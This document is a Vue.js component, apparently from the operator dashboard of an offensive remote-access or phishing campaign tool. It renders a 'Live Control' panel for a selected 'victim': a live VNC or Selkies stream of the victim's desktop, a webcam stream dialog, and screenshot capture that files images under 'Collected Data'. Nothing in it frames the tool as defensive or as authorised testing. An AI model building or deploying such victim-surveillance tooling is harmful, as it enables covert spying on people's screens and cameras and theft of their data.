<script setup>
import { ref, computed, defineAsyncComponent, onUnmounted, watch } from 'vue'
import { useToast } from 'primevue/usetoast'
import Card from 'primevue/card'
import Button from 'primevue/button'
import Dialog from 'primevue/dialog'
import { backendService } from '@/services/backend'
import { formatDateLocal } from '@/utils/utils'

const VNCStreamCard = defineAsyncComponent(() => import('@/components/dashboard/stream/VNCStreamCard.vue'))
const StreamCard = defineAsyncComponent(() => import('@/components/dashboard/stream/StreamCard.vue'))
const WebcamStreamCard = defineAsyncComponent(() => import('@/components/dashboard/stream/WebcamStreamCard.vue'))
const ScreenshotCard = defineAsyncComponent(() => import('@/components/dashboard/stream/ScreenshotCard.vue'))

const props = defineProps({
    victim: Object,
    campaign: Object
})

const toast = useToast()
const activeView = ref(props.victim.is_active ? 'stream' : 'screenshot') // 'stream' | 'webcam' | 'screenshot'
const webcamDialogVisible = ref(false)
const screenshots = ref([])
const isLoading = ref(false)
const isCapturingScreenshot = ref(false)
const screenshotsUpdatedAt = ref(null)
const streamAccessUrl = ref(null)
const isLoadingStreamAccess = ref(false)

const isVNC = computed(() => props.campaign?.protocol === 'vnc')
const isSelkies = computed(() => props.campaign?.protocol === 'selkies')
const isConnected = computed(() => Boolean(props.victim?.is_active) === true)
const selkiesStreamUrl = computed(() => streamAccessUrl.value)

async function loadStreamAccess() {
    if (!isSelkies.value || !isConnected.value || isLoadingStreamAccess.value) return
    isLoadingStreamAccess.value = true
    try {
        const response = await backendService.createVictimStreamAccess(
            props.campaign.id,
            props.victim.id
        )
        streamAccessUrl.value = response.access_url
    } catch (error) {
        console.error('Failed to authorize victim stream:', error)
        streamAccessUrl.value = null
        toast.add({
            severity: 'error',
            summary: 'Stream unavailable',
            detail: 'Could not authorize the live stream',
            life: 3000
        })
    } finally {
        isLoadingStreamAccess.value = false
    }
}

function openWebcam() {
    if (!isConnected.value) return
    webcamDialogVisible.value = true
}

function revokeScreenshotUrls(items = screenshots.value) {
    items.forEach((screenshot) => {
        if (screenshot.itemImageSrc?.startsWith('blob:')) {
            URL.revokeObjectURL(screenshot.itemImageSrc)
        }
    })
}

const fetchScreenshots = async (force = false) => {
    if (isLoading.value || (!force && activeView.value !== 'screenshot')) return

    try {
        isLoading.value = true

        const response = await backendService.getScreenshots(props.campaign.id, props.victim.id)

        if (!response || response.length === 0) {
            revokeScreenshotUrls()
            screenshots.value = []
            screenshotsUpdatedAt.value = new Date()
            return
        }

        // Load every screenshot while limiting concurrent file transfers.
        const screenshotsWithBlobs = []
        const batchSize = 6
        for (let offset = 0; offset < response.length; offset += batchSize) {
            const batch = response.slice(offset, offset + batchSize)
            const loadedBatch = await Promise.all(
                batch.map(async (s) => {
                    try {
                        const fileResponse = await backendService.getFileBlob(s.download_url)
                        const blob = fileResponse.data
                        const blobUrl = URL.createObjectURL(blob)

                        return {
                            id: s.id,
                            itemImageSrc: blobUrl,
                            thumbnailImageSrc: blobUrl,
                            full_size: blobUrl,
                            thumbnail: blobUrl,
                            alt: s.name || `Screenshot ${s.id}`,
                            timestamp: s.collected_at,
                            url: s.url || 'N/A',
                            resolution: s.resolution || '1920x1080',
                            size: blob.size,
                            blob: blob,
                            created_at: formatDateLocal(s.collected_at),
                        }
                    } catch (error) {
                        console.error(`Failed to load screenshot ${s.id}:`, error)
                        return null
                    }
                })
            )
            screenshotsWithBlobs.push(...loadedBatch)
        }

        // Replace the gallery atomically, then release superseded blob URLs.
        const oldScreenshots = screenshots.value
        screenshots.value = screenshotsWithBlobs.filter(s => s !== null)
        revokeScreenshotUrls(oldScreenshots)
        screenshotsUpdatedAt.value = new Date()
    } catch (error) {
        console.error('❌ Failed to fetch screenshots:', error)
        revokeScreenshotUrls()
        screenshots.value = []

        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'Failed to load screenshots',
            life: 3000
        })
    } finally {
        isLoading.value = false
    }
}

async function captureScreenshot() {
    if (!isConnected.value || isCapturingScreenshot.value) return

    isCapturingScreenshot.value = true
    try {
        await backendService.captureScreenshot(props.campaign.id, props.victim.id)
        toast.add({
            severity: 'success',
            summary: 'Screenshot captured',
            detail: 'The current victim desktop was added to Collected Data',
            life: 3000
        })
        if (activeView.value === 'screenshot') {
            await fetchScreenshots(true)
        }
    } catch (error) {
        console.error('Failed to capture screenshot:', error)
        toast.add({
            severity: 'error',
            summary: 'Capture failed',
            detail: error.message || 'Could not capture the victim desktop',
            life: 4000
        })
    } finally {
        isCapturingScreenshot.value = false
    }
}

watch(activeView, (view) => {
    if (view === 'screenshot') {
        fetchScreenshots()
    } else {
        loadStreamAccess()
    }
}, { immediate: true })

watch(isConnected, (connected) => {
    if (!connected && activeView.value === 'stream') {
        activeView.value = 'screenshot'
        streamAccessUrl.value = null
    } else if (connected && activeView.value === 'stream') {
        loadStreamAccess()
    }
})

onUnmounted(() => {
    revokeScreenshotUrls()
})
</script>

<template>
    <Card class="live-view-panel">
        <template #title>
            <div class="panel-header">
                <h3>
                    <i class="pi pi-desktop"></i>
                    Live Control
                </h3>
                <div class="view-switcher">
                    <Button
                        class="view-toggle-button"
                        label="Stream"
                        :outlined="activeView !== 'stream'"
                        size="small"
                        @click="activeView = 'stream'"
                        :disabled="!isConnected"
                    />
                    <Button
                        class="view-toggle-button"
                        label="Screenshot"
                        :outlined="activeView !== 'screenshot'"
                        size="small"
                        @click="activeView = 'screenshot'"
                    />
                    <Button
                        class="view-toggle-button"
                        label="Webcam"
                        :outlined="activeView !== 'webcam'"
                        size="small"
                        @click="openWebcam"
                        :disabled="!isConnected"
                    />
                </div>
            </div>
        </template>

        <template #content>
            <!-- VNC Stream -->
            <div v-if="activeView === 'stream' && isConnected" class="stream-container">
                <VNCStreamCard v-if="isVNC"
                    :stream-url="`https://${campaign.host_ip}/${campaign.id}/v/${victim.id}/`"
                    :campaign-id="campaign.id"
                    :victim-id="victim.id"
                    :is-live="victim.is_active"
                    :capture-pending="isCapturingScreenshot"
                    @capture-requested="captureScreenshot"
                />
                <StreamCard v-else-if="isSelkies"
                    :stream-url="selkiesStreamUrl"
                    :campaign-id="campaign.id"
                    :victim-id="victim.id"
                    :is-live="victim.is_active"
                    :capture-pending="isCapturingScreenshot"
                    @capture-requested="captureScreenshot"
                />
                <div v-else class="no-stream">
                    <i class="pi pi-video-slash"></i>
                    <p>No stream available</p>
                </div>
            </div>

            <!-- Screenshot View -->
            <div v-else-if="activeView === 'screenshot'" class="stream-container">
                <ScreenshotCard
                    :campaign-id="campaign.id"
                    :victim-id="victim.id"
                    :screenshots="screenshots"
                    :loading="isLoading"
                    :capture-pending="isCapturingScreenshot"
                    :last-updated="screenshotsUpdatedAt"
                    :can-capture="isConnected"
                    @refresh="fetchScreenshots(true)"
                    @capture="captureScreenshot"
                />
            </div>

            <!-- Offline State -->
            <div v-else class="no-stream">
                <i class="pi pi-exclamation-circle"></i>
                <p>Victim is offline</p>
                <small>Last seen: {{ formatLastSeen(victim.last_seen) }}</small>
            </div>

            <!-- Stream Controls -->
            <!-- <div v-if="isConnected && activeView === 'stream'" class="stream-controls">
                <div class="controls-left">
                    <Button
                        icon="pi pi-camera"
                        label="Screenshot"
                        size="small"
                        @click="captureScreenshot"
                    />
                    <Button
                        icon="pi pi-window-maximize"
                        label="Fullscreen"
                        size="small"
                        outlined
                        @click="openFullscreen"
                    />
                </div>
                <div class="controls-right">
                    <span class="stream-quality">
                        <i class="pi pi-circle-fill live-indicator"></i>
                        Live
                    </span>
                </div>
            </div> -->
            <!-- Webcam Dialog -->
            <Dialog
                v-model:visible="webcamDialogVisible"
                modal
                :draggable="false"
                header="Webcam Stream"
                :style="{ width: '60vw', maxWidth: '900px' }"
            >
                <WebcamStreamCard
                    v-if="isConnected && webcamDialogVisible"
                    :campaignId="campaign.id"
                    :victimId="victim.id"
                />
            </Dialog>
        </template>
    </Card>
</template>

<script>
function formatLastSeen(timestamp) {
    if (!timestamp) return 'N/A'
    const now = new Date()
    const then = new Date(timestamp)
    const diff = now - then
    const minutes = Math.floor(diff / 60000)

    if (minutes < 60) return `${minutes}m ago`
    const hours = Math.floor(minutes / 60)
    return `${hours}h ago`
}
</script>

<style scoped>
.live-view-panel {
    height: 100%;
}

.live-view-panel :deep(.p-card-body) {
    height: 100%;
    display: flex;
    flex-direction: column;
}

.live-view-panel :deep(.p-card-content) {
    flex: 1;
    display: flex;
    flex-direction: column;
    padding: 0;
}

.panel-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 1rem;
}

.panel-header h3 {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-size: 1.125rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
}

.view-switcher {
    display: flex;
    align-items: center;
    gap: 0.375rem;
}

.view-switcher :deep(.view-toggle-button) {
    min-height: 2rem;
    padding: 0.375rem 0.625rem;
    font-size: 0.8125rem;
    line-height: 1;
}

.stream-container {
    flex: 1;
    background-color: var(--color-background-mute);
    border: 1px solid var(--color-border);
    border-radius: var(--radius-md);
    overflow: hidden;
    min-height: 400px;
    display: flex;
    align-items: center;
    justify-content: center;
}

.stream-container :deep(.stream-card) {
    border: 0;
    border-radius: 0;
    background: transparent;
    box-shadow: none;
}

.stream-container :deep(.stream-card .p-card-body),
.stream-container :deep(.stream-card .p-card-content) {
    padding: 0;
}

.stream-container :deep(.stream-card .p-card-body),
.stream-container :deep(.stream-card .p-card-caption) {
    gap: 0;
}

.stream-container :deep(.stream-card .p-card-title) {
    margin: 0;
    padding: 0.75rem 1rem;
    border-bottom: 0;
}

.stream-container :deep(.stream-card .stream-container) {
    border: 0;
    border-radius: 0;
}

.no-stream {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 0.75rem;
    color: var(--color-text-mute);
    padding: 3rem;
}

.no-stream i {
    font-size: 3rem;
    opacity: 0.5;
}

.no-stream p {
    margin: 0;
    font-size: 1.125rem;
    font-weight: 500;
}

.no-stream small {
    font-size: 0.875rem;
}

.stream-controls {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 1rem;
    padding-top: 1rem;
    border-top: 1px solid var(--color-border);
}

.controls-left {
    display: flex;
    gap: 0.5rem;
}

.stream-quality {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    font-size: 0.875rem;
    color: var(--color-text-mute);
    font-weight: 500;
}

.live-indicator {
    color: var(--success);
    font-size: 0.5rem;
}
</style>
